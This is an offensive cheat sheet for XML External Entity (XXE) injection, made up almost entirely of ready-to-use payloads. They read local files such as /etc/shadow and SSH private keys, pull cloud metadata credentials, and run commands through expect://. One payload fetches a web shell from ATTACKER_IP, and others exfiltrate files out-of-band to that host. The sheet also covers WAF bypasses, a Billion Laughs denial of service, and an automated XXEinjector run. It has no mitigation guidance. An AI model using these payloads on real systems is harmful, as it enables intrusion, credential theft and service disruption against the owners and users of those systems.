# XML External Entity (XXE) Injection

Exploit XML parsers to read local files, perform SSRF, or achieve RCE.

---

## Identification

Look for:
- XML data in POST requests
- SOAP APIs
- File uploads accepting SVG/XML/DOCX
- `Content-Type: application/xml`

### Test for XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe "XXE_TEST">
]>
<root>
<data>&xxe;</data>
</root>
```

If `XXE_TEST` appears in response = vulnerable

---

## Basic XXE - Read Local Files

### /etc/passwd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
<email>&xxe;</email>
</root>
```

### Windows Files

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
```

### Common Files to Read

```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///var/www/html/config.php
file:///home/user/.ssh/id_rsa
file:///c:/windows/win.ini
file:///c:/inetpub/wwwroot/web.config
```

---

## PHP Filter - Read Source Code

Use PHP wrapper to base64 encode (prevents XML breaking):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<email>&xxe;</email>
</root>
```

Decode response:

```bash
echo "BASE64_DATA" | base64 -d
```

---

## XXE to SSRF

### Port Scan

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
```

### Internal Services

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
```

### Cloud Metadata

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

---

## XXE to RCE (PHP expect://)

Requires `expect` module installed:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root><email>&xxe;</email></root>
```

### Download Web Shell

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER_IP/shell.php'">
]>
<root><email>&xxe;</email></root>
```

Note: Use `$IFS` instead of spaces to avoid breaking XML.

---

## Advanced XXE - CDATA Exfiltration

For files with XML special characters (`<`, `>`, `&`):

### Host xxe.dtd on your server

```xml
<!ENTITY joined "%begin;%file;%end;">
```

### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/config.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```

Start server:

```bash
python3 -m http.server 8000
```

---

## Blind XXE - Error-Based

When no output displayed but errors are shown.

### Host error.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/error.dtd">
  %xxe;
  %error;
]>
```

File contents appear in error message.

---

## Blind XXE - Out-of-Band (OOB)

Completely blind - exfiltrate via HTTP request.

### Host oob.dtd

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?data=%file;'>">
```

### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/oob.dtd">
  %xxe;
  %oob;
]>
<root>&content;</root>
```

### Receive & Decode

```bash
# Start listener
php -S 0.0.0.0:8000

# Or use netcat and decode manually
nc -lvnp 8000
# GET /?data=cm9vdDp4OjA6M... HTTP/1.1
echo "cm9vdDp4OjA6M..." | base64 -d
```

### PHP Auto-Decode Script

```php
<?php
if(isset($_GET['data'])){
    error_log("\n\n" . base64_decode($_GET['data']));
}
?>
```

---

## XXE in File Uploads

### SVG XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XLSX/DOCX XXE

1. Unzip the file
2. Edit `[Content_Types].xml` or `xl/workbook.xml`
3. Add XXE payload
4. Re-zip and upload

---

## XXE DoS (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

Note: Modern servers often protected against this.

---

## XXEinjector (Automated Tool)

```bash
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

# Create request file with XXEINJECT marker
cat > xxe.req << 'EOF'
POST /submit HTTP/1.1
Host: TARGET
Content-Type: application/xml

<?xml version="1.0"?>
XXEINJECT
EOF

# Run OOB exfiltration
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 \
  --file=xxe.req --path=/etc/passwd --oob=http --phpfilter

# Check results
cat Logs/TARGET/etc/passwd.log
```

---

## Bypass WAF

### UTF-7 Encoding

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AFs-+AD4-
```

### Parameter Entities Only

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">
  %xxe;
]>
```

### URL Encoding

```
file:///etc%2fpasswd
```

---

## Quick Reference Payloads

| Target | Payload |
|--------|---------|
| /etc/passwd | `<!ENTITY x SYSTEM "file:///etc/passwd">` |
| PHP Source | `<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=config.php">` |
| AWS Metadata | `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` |
| SSRF Internal | `<!ENTITY x SYSTEM "http://127.0.0.1:8080/">` |
| RCE (expect) | `<!ENTITY x SYSTEM "expect://id">` |
